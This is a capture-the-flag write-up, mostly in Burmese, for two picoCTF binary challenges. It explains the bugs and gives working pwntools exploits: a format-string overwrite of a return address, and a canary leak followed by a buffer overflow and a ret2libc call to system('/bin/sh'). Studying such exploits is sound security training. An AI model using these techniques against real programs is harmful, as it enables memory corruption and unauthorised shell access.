
#### echo valley0

```bash
─$ pwn checksec valley             
[*] '/home/Jackfruit/cate/learn/binary/stack/picoCTF/echo_valley/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes

```

Full RELRO -  ဆိုတော့ ငါတို့ GOT overwrite လုပ်လို့မရဘူး ပြီးရင် got address တွေက program စကတည်းကသတ်မှတ်ပေးထားတယ်
PIE enable -  ဆိုတော့ ဆိုတော့ address တွေက fixed မဟုတ်တော့ဘူး
Canary found - buffer over flow protection လည်းရှိတယ်
NX enabled - shell Injection လည်းရှိတယ်
SHSTK:      Enabled - shadow stack , return address ကို overwrite လို့မရဘူး
IBT: Enabled  -  (Indirect Branch Tracking)Jump/call လုပ်တဲ့ destination က legitimate (တရားဝင်) နေရာဟုတ်မဟုတ် စစ်ဆေးတယ် 
Stripped:   No - security ပိတ်ထားတာဆို ဒီကောင်ဘဲရှိတယ်

#### `Program Flow`

```
                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/picoCTF/echo_valley]
└─$ ./valley    
Welcome to the Echo Valley, Try Shouting: 
hello
You heard in the distance: hello




```

```c

/* WARNING: Unknown calling convention */

int main(void)

{
  echo_valley();
  return 0;
}

```

```c

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void echo_valley(void)

{
  long lVar1;
  int iVar2;
  char *pcVar3;
  long in_FS_OFFSET;
  char buf [100];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Welcome to the Echo Valley, Try Shouting: ");
  while( true ) {
    fflush(stdout);
    pcVar3 = fgets(buf,100,stdin);
    if (pcVar3 == (char *)0x0) {
      puts("\nEOF detected. Exiting...");
                      /* WARNING: Subroutine does not return */
      exit(0);
    }
    iVar2 = strcmp(buf,"exit\n");
    if (iVar2 == 0) break;
    printf("You heard in the distance: ");
    printf(buf);
    fflush(stdout);
  }
  puts("The Valley Disappears");
  fflush(stdout);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


```

ရိုးရိုးရှင်းရှင်းလေးဘဲ main ကနေ  `echo_valley` function ကို ခေါ်တယ်
input တောင်းတယ် input ကိုထုတ်ပြပေးတယ်
ထပ်တောင်းတယ် ထပ်ထုတ်ပြတယ်

```c

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void print_flag(void)

{
  FILE *__stream;
  FILE *file;
  char buf [32];
  
  __stream = fopen("/home/valley/flag.txt","r");
  if (__stream == (FILE *)0x0) {
    perror("Failed to open flag file");
                      /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(buf,0x20,__stream);
  printf("Congrats! Here is your flag: %s",buf);
  fclose(__stream);
                      /* WARNING: Subroutine does not return */
  exit(0);
}

```

flag ထုတ်ပေးတဲ့ function ပါတယ်

##### `Vulnerabilites`


```c
    pcVar3 = fgets(buf,100,stdin);
    if (pcVar3 == (char *)0x0) {
      puts("\nEOF detected. Exiting...");
                      /* WARNING: Subroutine does not return */
      exit(0);
    }
    iVar2 = strcmp(buf,"exit\n");
    if (iVar2 == 0) break;
    printf("You heard in the distance: ");
    printf(buf);
```
`echo_valley` function မှာ user input ကိုဘဲ printfမှာ direct ထုတ်တယ် `printf` vuln ပါနေတယ်
ဆိုတော့ ငါတို့က `printf` ကိုအသုံးချရမယ်
flag function လည်းပါတယ်ဆိုတော့ `printf` ကိုသုံးပြီး `echo_valley` ရဲ့ return address ကို flag function addressနဲ့ပြောင်းရမယ်

buffer အတွက်  `char buf [100];` ဆိုတော့ 
decimal 100 - 1byte အခု 100
ဒီကောင်က 64 bit program ဆိုတော့
100 ကို 8 နဲ့စား = 12 , 4 ကြွင်း
stack အတွက် 12နေရာ နဲ့ နောက်ထပ်နေရာတစ်ဝက်
စုစုပေါင်း 13 နေရာပေါ့

```c
pwndbg> tel  50
00:0000│ rdi rsp 0x7fffffffdb00 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
01:0008│-068     0x7fffffffdb08 ◂— 'baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
02:0010│-060     0x7fffffffdb10 ◂— 'caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
03:0018│-058     0x7fffffffdb18 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
04:0020│-050     0x7fffffffdb20 ◂— 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
05:0028│-048     0x7fffffffdb28 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
06:0030│-040     0x7fffffffdb30 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
07:0038│-038     0x7fffffffdb38 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
08:0040│-030     0x7fffffffdb40 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
09:0048│-028     0x7fffffffdb48 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaa'
0a:0050│-020     0x7fffffffdb50 ◂— 'kaaaaaaalaaaaaaamaa'
0b:0058│-018     0x7fffffffdb58 ◂— 'laaaaaaamaa'
0c:0060│-010     0x7fffffffdb60 ◂— 0x61616d /* 'maa' */
0d:0068│-008     0x7fffffffdb68 ◂— 0x45f94fc3fcd33c00
0e:0070│ rbp     0x7fffffffdb70 —▸ 0x7fffffffdb80 ◂— 1
0f:0078│+008     0x7fffffffdb78 —▸ 0x555555555413 (main+18) ◂— mov eax, 0
10:0080│+010     0x7fffffffdb80 ◂— 1
11:0088│+018     0x7fffffffdb88 —▸ 0x7ffff7c29f68 (__libc_start_call_main+120) ◂— mov edi, eax

```


64bit program ဆိုတော့ `printf` ခေါ်ရင် argumentအနေနဲ့က registerတွေသုံးမယ်

mov rdi, 1   ; arg1
mov rsi, 2   ; arg2
mov rdx, 3   ; arg3
mov rcx, 4   ; arg4
mov r8, 5    ; arg5
mov r9, 6    ; arg6

ဒီမှာ `rdi` က buffer address သိမ်းထားတာဆိုတော့ `printf` နဲ့ ဒီကောင့်ကို leak လို့မရ `rsi` ကနေစတယ် ဆိုတော့
register 5 ခု , ဒီ 5ခုကို `printf` နဲ့ leak လုပ်ပြီးမှ stack ကကောင်တွေကို leak လို့ရမှာ

register 5ခု + buffer 13နေရာ = 18နေရာ
ဆိုတော့ stack ကိုတစ်ချက်ကြည့်လိုက်မယ်


```c
pwndbg> tel  50
00:0000│ rdi rsp 0x7fffffffdb00 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
01:0008│-068     0x7fffffffdb08 ◂— 'baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
02:0010│-060     0x7fffffffdb10 ◂— 'caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
03:0018│-058     0x7fffffffdb18 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
04:0020│-050     0x7fffffffdb20 ◂— 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
05:0028│-048     0x7fffffffdb28 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
06:0030│-040     0x7fffffffdb30 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
07:0038│-038     0x7fffffffdb38 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
08:0040│-030     0x7fffffffdb40 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa'
09:0048│-028     0x7fffffffdb48 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaa'
0a:0050│-020     0x7fffffffdb50 ◂— 'kaaaaaaalaaaaaaamaa'
0b:0058│-018     0x7fffffffdb58 ◂— 'laaaaaaamaa'
0c:0060│-010     0x7fffffffdb60 ◂— 0x61616d /* 'maa' */
0d:0068│-008     0x7fffffffdb68 ◂— 0x45f94fc3fcd33c00
0e:0070│ rbp     0x7fffffffdb70 —▸ 0x7fffffffdb80 ◂— 1
0f:0078│+008     0x7fffffffdb78 —▸ 0x555555555413 (main+18) ◂— mov eax, 0
10:0080│+010     0x7fffffffdb80 ◂— 1
11:0088│+018     0x7fffffffdb88 —▸ 0x7ffff7c29f68 (__libc_start_call_main+120) ◂— mov edi, eax
```

ဒီမှာ က တစ်ခုသွားတွေ့တယ်
`echo_valley` ရဲ့ stored `rbp` address `0x7fffffffdb80` က return address နဲ့ 8 လုံးဘဲကွာတယ်

ဆိုတော့ `rbp` က `printf rdi` နဲ့ အခု20 အကွာမှာရှိတယ် 
`%20$lx` နဲ့ leak လုပ်ပြီး -8 ခုနှုတ်လိုက်ရင် return address ကို store လုပ်ထားတဲ့ stack address ကိုရမယ်

အဲခါကြရင် ဒီကောင့်ကို buffer အစကနေ ခပ်ဝေးဝေနေရာမှာ ပြန်ထည့်ပြီး
`printf` နဲ့ bufferထဲကကောင်ကိုပြန် ပြင်လို့ရတယ် ( `printf` က stack ‌address ကိုဘယ်တာ့မှ outputမထုတ် leak မလုပ်ဘူး stack addressထဲမှာ store လုပ်ထားတဲ့ကောင်ကိုဘဲ မြင်တယ် ထုတ်တယ်)


PIE enable မှာဆို lower 3 nibbles တွေတူတယ်ဆိုတော့ return address 3nibbles ကို flag function ရဲ့ 3 nibblesနဲ့ချိန်းလိုက်ရင်အဆင်ပြေသွားပြီ


#### `Exploits & Techniques`

```python

from pwn import *

host = 'shape-facility.picoctf.net'
port = '51451'

#conn = remote(host,port)
conn = process("./valley")
print(conn.recvuntil(b'Try Shouting'))
conn.sendline(b'%20$lx')

print(conn.recvuntil(b'You heard in the distance: '))
response = conn.recvline().decode('utf-8')[:-1]
number = int(response,16)
print(response,p64(number))
number = number - 8



print(hex(number))

tosend = (b'AAAAAAAAAAAAAAAAAAAAAAAA' + p64(number) + p64(number+1))
conn.sendline(tosend)
print(tosend)
conn.interactive()
conn.close()
```

ဒီမှာဆို store rbp address ကို leak တယ်
ပြီးရင် 8 နုတ်တယ် အဲကြ return address ကို store လုပ်ထားတဲ့ stack address ဖြစ်သွားပြီ
ပြီးရင် -1 နုတ်တယ် အဲကြ return address တစ်ခုရဲ့ 2 nibbles ကို တစ်ခုချင်းစီကိုယ်စားပြုတယ် stack ‌address နှစ်ခုရတယ်
ဒီမှာ A 16 လုံးအကွာမှာ address နှစ်ခုကိုထားပြီး buffer ထဲ ထည့်လိုက်တယ် stack rsp ကနေ 3ခုအကွာမှာ
ဒီ address နှစ်ခုက ရောက်သွားတယ်

bufferတွေရဲ့ သဘောတရားသိဖို့လိုတယ်
bufferတွေရဲ့ သဘောတရားက 100ပေးထားပေမဲ့ fgets က အမြဲ null terminator (\0)ပါလာတယ်ဆိုတာသိရမယ်
gdb ထဲမှာ တော့ \0 ကိုမမြင်ရ
ဆိုတော့ ဒီမှာ fgets ရဲ့ buffer limit က 99 , \0 အတွက်တစ်ခုချိန်ရလို့
printf နဲ့ဖတ်ရင်လည်း \0 ထိဘဲဖတ်သွားတယ် 
ဆိုတော့ စစချင်းက  buffer 50ယူတယ်
buffer 50 \0
နောက်ထပ် buffer 20\0 ယူတယ်
အဲကြ buffer 20\0 ကို buffer 50\0ရဲ့ ရှေ့ကနေရာ 21နေရာကဖယ်ပေးရတယ် ဒါမဲ့ buffer 50\0 ရဲ့နောက်က dataတွေက 
stack buffer ထဲမှာကျန်ရှိသေးတယ်
printfနဲ့ထုတ်ပြရင်ကြ  buffer 20\0 ဘဲထုတ်ပြတယ် ဘာလို့ဆို \0 ထိဘဲမလို့

ဆိုတော့ ငါတို့ အခု bufferတွေရဲ့သဘောတရားကိုသုံးပြီး
address နှစ်ခုကို stack ရဲ့ 3 နေရာအကွာထည့်ထားတယ်
နောက်ထပ် input တောင်းရင် buffer 15မကျော်မချင်း ငါတို့ ထည့်ထားတဲ့ addressက ပုံပျက်မှာမဟုတ်ဘူး

```c
00:0000│ rdi rsp 0x7ffcf3a19410 ◂— 0x4141414141414141 ('AAAAAAAA')
01:0008│-068     0x7ffcf3a19418 ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│-060     0x7ffcf3a19420 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│-058     0x7ffcf3a19428 —▸ 0x7ffcf3a19488 —▸ 0x55b035cc7413 (main+18) ◂— mov eax, 0
04:0020│-050     0x7ffcf3a19430 —▸ 0x7ffcf3a19489 ◂— 0x1000055b035cc74
05:0028│-048     0x7ffcf3a19438 ◂— 0xa /* '\n' */
06:0030│-040     0x7ffcf3a19440 ◂— 0x5000000019
07:0038│-038     0x7ffcf3a19448 ◂— 0
08:0040│-030     0x7ffcf3a19450 ◂— 0
09:0048│-028     0x7ffcf3a19458 ◂— 0
0a:0050│-020     0x7ffcf3a19460 ◂— 0
0b:0058│-018     0x7ffcf3a19468 ◂— 0
0c:0060│-010     0x7ffcf3a19470 ◂— 0
0d:0068│-008     0x7ffcf3a19478 ◂— 0xd3239550da78d300
0e:0070│ rbp     0x7ffcf3a19480 —▸ 0x7ffcf3a19490 ◂— 1
0f:0078│+008     0x7ffcf3a19488 —▸ 0x55b035cc7413 (main+18) ◂— mov eax, 0
10:0080│+010     0x7ffcf3a19490 ◂— 1
11:0088│+018     0x7ffcf3a19498 —▸ 0x7f9526829f68 (__libc_start_call_main+120) ◂— mov edi, eax



```

ဒီမှာဆို address နှစ်ခုက buffer ထဲရောက်သွားပြီ 
ဘာလို့  `0x7ffcf3a19488`  နဲ့ `0x7ffcf3a19489` ဖြစ်လဲဆို


little endian နဲ့ကြည့်ရင် 

```

0x7ffcf3a19488: 0x13    0x74    0xcc    0x35    0xb0    0x55    0x00    0x00


```

တစ်ခုချင်းခွဲကြည့်ရင်

```
0x7ffcf3a19488: 0x13
0x7ffcf3a19489: 0x74
0x7ffcf3a1948a: 0xcc
0x7ffcf3a1948b: 0x35
0x7ffcf3a1948c: 0xb0
0x7ffcf3a1948d: 0x55
0x7ffcf3a1948e: 0x00
0x7ffcf3a1948f: 0x00
```

ဆိုတော့ ငါတို့ပြောင်းဖို့ လိုတာ က 3 nibbles  `0x55b035cc7413` ရဲ့ 413 ကို
 but အဆင်ပြေအောင် 6413 ကို change မယ်
 အဲကြောင့် `0x7ffcf3a19488` နဲ့ `0x7ffcf3a19489` ကိုယူတာဖြစ်တယ်

ဒီမှာ hello ဆိုတာ ထပ်ရိုက်ပေမဲ့ အရင် လက်ကျန် address တွေကတော့ ရှိတုန်းဘဲ

```c
00:0000│ rdi rsp 0x7ffcf3a19410 ◂— 0x41000a6f6c6c6568 /* 'hello\n' */
01:0008│-068     0x7ffcf3a19418 ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│-060     0x7ffcf3a19420 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│-058     0x7ffcf3a19428 —▸ 0x7ffcf3a19488 —▸ 0x55b035cc7413 (main+18) ◂— mov eax, 0
04:0020│-050     0x7ffcf3a19430 —▸ 0x7ffcf3a19489 ◂— 0x1000055b035cc74
05:0028│-048     0x7ffcf3a19438 ◂— 0xa /* '\n' */
06:0030│-040     0x7ffcf3a19440 ◂— 0x5000000019
07:0038│-038     0x7ffcf3a19448 ◂— 0
08:0040│-030     0x7ffcf3a19450 ◂— 0
09:0048│-028     0x7ffcf3a19458 ◂— 0
0a:0050│-020     0x7ffcf3a19460 ◂— 0
0b:0058│-018     0x7ffcf3a19468 ◂— 0
0c:0060│-010     0x7ffcf3a19470 ◂— 0
0d:0068│-008     0x7ffcf3a19478 ◂— 0xd3239550da78d300
0e:0070│ rbp     0x7ffcf3a19480 —▸ 0x7ffcf3a19490 ◂— 1
0f:0078│+008     0x7ffcf3a19488 —▸ 0x55b035cc7413 (main+18) ◂— mov eax, 0
10:0080│+010     0x7ffcf3a19490 ◂— 1
11:0088│+018     0x7ffcf3a19498 —▸ 0x7f9526829f68 (__libc_start_call_main+120) ◂— mov edi, eax



```

```c
b'AAAAAAAAAAAAAAAAAAAAAAAA\x88\x94\xa1\xf3\xfc\x7f\x00\x00\x89\x94\xa1\xf3\xfc\x7f\x00\x00'
[*] Switching to interactive mode
You heard in the distance: AAAAAAAAAAAAAAAAAAAAAAAA\x88\x94\xa1\xf3\xfc\x7f$ hello
You heard in the distance: hello
$ %8$lx
You heard in the distance: 4141414141414141
$ %9$lx
You heard in the distance: 7ffcf3a19488
$ %10$lx
You heard in the distance: 7ffcf3a19489
$  



```

ဆို‌တော့ ငါတို့ က payload ရေးမယ်

```
pwndbg> disas print_flag
Dump of assembler code for function print_flag:
   0x000055b035cc7269 <+0>:     endbr64
   0x000055b035cc726d <+4>:     push   rbp
   0x000055b035cc726e <+5>:     mov    rbp,rsp
   0x000055b035cc7271 <+8>:     sub    rsp,0x40
   0x000055b035cc7275 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x000055b035cc727e <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x000055b035cc7282 <+25>:    xor    eax,eax
   0x000055b035cc7284 <+27>:    lea    rax,[rip+0xd7d]        # 0x55b035cc8008
   0x000055b035cc728b <+34>:    mov    rsi,rax
   0x000055b035cc728e <+37>:    lea    rax,[rip+0xd75]        # 0x55b035cc800a
   0x000055b035cc7295 <+44>:    mov    rdi,rax
   0x000055b035cc7298 <+47>:    call   0x55b035cc7150 <fopen@plt>
   0x000055b035cc729d <+52>:    mov    QWORD PTR [rbp-0x38],rax
   0x000055b035cc72a1 <+56>:    cmp    QWORD PTR [rbp-0x38],0x0
   0x000055b035cc72a6 <+61>:    jne    0x55b035cc72c1 <print_flag+88>
...

```

flag function address က `0x000055b035cc7269`
413 ကို 269 နဲ့ change မယ်

```
$ %105c%9$hhn
You heard in the distance:  
```

```c
wndbg> tel 20
00:0000│ rsp 0x7ffcf3a19410 ◂— '%105c%9$hnn\n'
01:0008│-068 0x7ffcf3a19418 ◂— 0x414141000a6e6e68 /* 'hnn\n' */
02:0010│-060 0x7ffcf3a19420 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│-058 0x7ffcf3a19428 —▸ 0x7ffcf3a19488 ◂— 0x55b035cc7469 /* 'i' */
04:0020│-050 0x7ffcf3a19430 —▸ 0x7ffcf3a19489 ◂— 0x1000055b035cc74
05:0028│-048 0x7ffcf3a19438 ◂— 0xa /* '\n' */
06:0030│-040 0x7ffcf3a19440 ◂— 0x5000000019
07:0038│-038 0x7ffcf3a19448 ◂— 0
08:0040│-030 0x7ffcf3a19450 ◂— 0
09:0048│-028 0x7ffcf3a19458 ◂— 0
0a:0050│-020 0x7ffcf3a19460 ◂— 0
0b:0058│-018 0x7ffcf3a19468 ◂— 0
0c:0060│-010 0x7ffcf3a19470 ◂— 0
0d:0068│-008 0x7ffcf3a19478 ◂— 0xd3239550da78d300
0e:0070│ rbp 0x7ffcf3a19480 —▸ 0x7ffcf3a19490 ◂— 1
0f:0078│+008 0x7ffcf3a19488 ◂— 0x55b035cc7469 /* 'i' */
10:0080│+010 0x7ffcf3a19490 ◂— 1


```


```
$ %114c%10$hhn
You heard in the distance:  
```

```c
00:0000│ rsp 0x7ffcf3a19410 ◂— '%114c%10$hnn\n'
01:0008│-068 0x7ffcf3a19418 ◂— 0x4141000a6e6e6824 /* '$hnn\n' */
02:0010│-060 0x7ffcf3a19420 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│-058 0x7ffcf3a19428 —▸ 0x7ffcf3a19488 ◂— 0x55b035cc7269 /* 'ir' */
04:0020│-050 0x7ffcf3a19430 —▸ 0x7ffcf3a19489 ◂— 0x1000055b035cc72 /* 'r' */
05:0028│-048 0x7ffcf3a19438 ◂— 0xa /* '\n' */
06:0030│-040 0x7ffcf3a19440 ◂— 0x5000000019
07:0038│-038 0x7ffcf3a19448 ◂— 0
08:0040│-030 0x7ffcf3a19450 ◂— 0
09:0048│-028 0x7ffcf3a19458 ◂— 0
0a:0050│-020 0x7ffcf3a19460 ◂— 0
0b:0058│-018 0x7ffcf3a19468 ◂— 0
0c:0060│-010 0x7ffcf3a19470 ◂— 0
0d:0068│-008 0x7ffcf3a19478 ◂— 0xd3239550da78d300
0e:0070│ rbp 0x7ffcf3a19480 —▸ 0x7ffcf3a19490 ◂— 1
0f:0078│+008 0x7ffcf3a19488 ◂— 0x55b035cc7269 /* 'ir' */

```


```
$ exit
The Valley Disappears
Failed to open flag file: No such file or directory

Child exited with status 1
[*] Got EOF while reading in interactive

```
local ထဲမှာ flag မရှိလို့ဘာမှမပြတာ
finally success


----


#### Guessing Game 2

```
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/picoCTF/guessingGame2/vuln
Arch:     i386
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No

```

Full RELRO - ဆိုတော့ ငါတို့ GOT overwrite လုပ်လို့မရဘူး ပြီးရင် got address တွေက program စကတည်းကသတ်မှတ်ပေးထားတယ်
Canary found - buffer overflow protection ရှိတယ်
NX enabled  - shell injection လုပ်လို့မရ
No PIE - No PIE ဆို code address တွေ fixed ဖြစ်မယ် ROP gadget တွေရှာရလွယ်မယ်

ဆိုတော့ စလိုက်ရအောင်


#### `Program flow`

```
0x0804865f  do_stuff
0x0804876e  win
0x080487ff  main
```

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void main(void)

{
  __gid_t __rgid;
  undefined4 uVar1;
  int iVar2;
  
  setvbuf(_stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("Welcome to my guessing game!");
  uVar1 = get_version();
  printf("Version: %x\n\n",uVar1);
  do {
    do {
      iVar2 = do_stuff();
    } while (iVar2 == 0);
    win();
  } while( true );
}

```

program flow က main ကလာမယ် ပြီးရင် `do_stuff` ကိုခေါ်ပြီး random value ကို guess လုပ်ခိုင်းတယ်

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 do_stuff(void)

{
  int iVar1;
  long lVar2;
  int in_GS_OFFSET;
  undefined4 local_21c;
  char local_210 [512];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  iVar1 = get_random();
  local_21c = 0;
  puts("What number would you like to guess?");
  fgets(local_210,0x200,_stdin);
  lVar2 = atol(local_210);
  if (lVar2 == 0) {
    puts("That\'s not a valid number!");
  }
  else if (lVar2 == iVar1 % 0x1000 + 1) {
    puts("Congrats! You win! Your prize is this print statement!\n");
    local_21c = 1;
  }
  else {
    puts("Nope!\n");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    local_21c = __stack_chk_fail_local();
  }
  return local_21c;
}
```

user ဆီက input ကို number ဟုတ်မဟုတ်စစ်တယ်
ဆိုတော့ number က လွဲရင်ကျန်တာထည့်လို့မရ
guess တာမှန်ရင် win function ကို jump မယ်

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void win(void)

{
  int in_GS_OFFSET;
  char local_210 [512];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("New winner!\nName? ");
  gets(local_210);
  printf("Congrats: ");
  printf(local_210);
  puts("\n");
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}

```

name တောင်းမယ်
Congrats: လုပ်မယ်
ပြီးရင် `do_stuff` ဆီကို ထပ်သွားမယ်

#### `Vulnerabilities`

1. ဒီမှာက number guess ခိုင်းတာက limit မရှိလို့ `bruteforce` လုပ်လို့ရမယ်

```c

  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("New winner!\nName? ");
  gets(local_210);
  printf("Congrats: ");
  printf(local_210);
```
win function မှာက  user ဆီက input တောင်းပြီး `printf` မှာတစ်ခါတည်းထုတ်ပြတယ်
2. ဆိုတော့ `printf vuln` ကိုသုံးပြီး canary value ကို leak လို့ရတယ်
အဲ canary ကို buffer overflow တွေမှာသုံးမယ်

3. နောက်ပြီး gets သုံးထားတယ်ဘာမှကန့်သတ်ထားတာမရှိဘူး `bufferoverflow` လို့ရတယ်
 ငါတို့ win function ရဲ့ return address ကို overflowမယ်

ဒီမှာ flag ထုတ် ပေးတဲ့ function မရှိတော့ ` exec()` function ကိုခေါ်မှရမယ်
ဆိုတော့ ငါတို့ အရင်ဆုံး `libc` base address တွက်ဖို့ရာ
==NO PIE== ဆိုတော့ `puts` or `printf` ရဲ့  PLT address တွေက မပြောင်းလဲဘူးဆိုတော့ local မှာ down ထားတဲ့ programရဲ့ PLT addressတွေကိုသုံးပြီး
4. remote ရဲ့ `puts` or `printf` ရဲ့ GOT address ကို leak လုပ်မယ်
win ရဲ့ return address ကို puts PLT နဲ့ overwrite လုပ်မယ်
ပြီးရင် puts PLT ရဲ့ return address အဖြစ် puts PLT address နောက်ကနေ ဘဲ winထားမယ်
puts PLT ရဲ့ puts argument အဖြစ် return addressနောက်ကနေမှ  puts GOT entry address ကိုထားမယ်

ပြီးရင် ရလာတဲ့  GOT address တွေရဲ့ 3 nibbles ကိုယူပြီး `libc` version ရှာမယ်
`libc` base ကိုတွက်မယ်
5. offset သုံးပြီ exec() real address နဲ့ bin/bash address ကိုတွက်မယ်
win ရဲ့ return address ကို  exec() real address  နဲ့ overwrite လုပ်မယ်
return address အဖြစ် နောက်ကနေ ဘဲ winထားမယ်
return addressနောက်ကနေမှ argument အဖြစ် bin/bash address ကို ထားမယ်


#### `Exploit & Technique`

```python

from pwn import *

context.log_level = 'info'
context.binary = "./vuln"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("shape-facility.picoctf.net",58416)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break *0x080487ce
            continue
        ''')
    else:
        return process(elf.path)
    


def canary_leak(p):
     p.recvuntil(b"Name? ")
     p.sendline(b"%135$p")
     p.recvuntil(b"Congrats: ")
     canaryvalue = p.recvline()
     canaryvalue = canaryvalue.decode().replace("\n","")
     return canaryvalue

def bruteforce(p):
    #for i in range(-4000, 4096):
        try:
            i = -3727
            p.sendlineafter(b"What number would you like to guess?\n", str(i).encode())
            print(f"Trying number: {i}", end="\r")
            out = p.recvline().decode()
            if "Congrats!" in out:
                print(f"\n[+] Found the number: {i}")
                #p.recvuntil(b"Name? ") 
                return i
            
        except EOFError:
            print("error")
            return None    
        

def leakaddress(p, canary, n):
    canary = int(canary, 16)
    payload = b'A' * 512 + p32(canary) + b'B'*12
    payload += p32(elf.plt['puts'])
    payload += p32(elf.sym['win'])
    payload += p32(elf.got['puts'])
    p.sendlineafter("What number would you like to guess?\n", str(n).encode())
    p.recvuntil(b"Name? ")
    p.sendline(payload)
    
    a = p.readline()
    b = p.readline()               
    print(a.decode(), "  and "   ,b.decode())
    
    leaked_raw = p.recv(4)    
    leak_int = u32(leaked_raw) 
    
    return leak_int

def get_shell(io, canary, sys_addr, binsh_addr):
    canary = int(canary, 16)
    payload = b'A' * 512 + p32(canary) + b'B'*12
    payload += p32(sys_addr)
    payload += p32(elf.sym['win'])
    payload += p32(binsh_addr)
    io.recvuntil(b"Name? ")
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    io = start()
    num = bruteforce(io)
    canaryV = canary_leak(io)
    print(canaryV)
    #print(hex(elf.plt['printf']))
    #print(hex(elf.got['printf']))
    putsaddress = leakaddress(io, canaryV, num)
    libc_base = putsaddress - 0x067560
    sys_addr = libc_base + 0x03cf10
    binsh_addr = libc_base + 0x17b9db
    get_shell(io, canaryV, sys_addr, binsh_addr)

```

-----

